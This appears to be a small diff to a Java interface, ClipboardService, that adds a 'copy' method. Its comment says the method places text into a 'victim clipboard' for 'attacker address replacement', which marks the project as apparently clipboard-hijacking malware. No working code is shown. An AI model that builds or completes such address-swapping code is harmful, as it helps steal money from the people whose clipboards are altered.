@@ -17,5 +17,8 @@ public interface ClipboardService {
 
 	int size();
 
+	/** Copies text into the victim clipboard (attacker address replacement). */
+	boolean copy(String text);
+
 	Path flush(Path dir) throws Exception;
 }
